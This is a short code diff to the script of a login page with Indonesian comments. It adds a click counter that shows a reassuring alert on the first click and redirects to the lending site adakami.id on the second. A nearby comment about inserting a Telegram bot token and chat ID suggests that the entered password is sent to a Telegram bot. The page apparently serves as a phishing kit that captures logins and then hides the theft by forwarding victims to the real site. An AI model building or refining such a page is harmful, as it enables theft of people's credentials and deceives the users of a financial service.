@@ -37,12 +37,21 @@
     </div>
 
     <script>
+      let clickCount = 0;
       document.getElementById("loginButton").addEventListener("click", function () {
         const password = document.getElementById("password").value;
 
         if (!password) {
           alert("Password tidak boleh kosong!");
           return;
+        };
+        clickCount++; 
+        if (clickCount === 1) {
+        // Jika klik pertama, tampilkan alert
+        alert("Klik pertama, password sudah dimasukkan.");
+        } else if (clickCount === 2) {
+            // Jika klik kedua, arahkan ke URL tertentu
+            window.location.href = "https://www.adakami.id/";  // Ganti dengan URL tujuan Anda
         }
 
         // Ganti dengan token bot Telegram Anda dan chat ID Anda
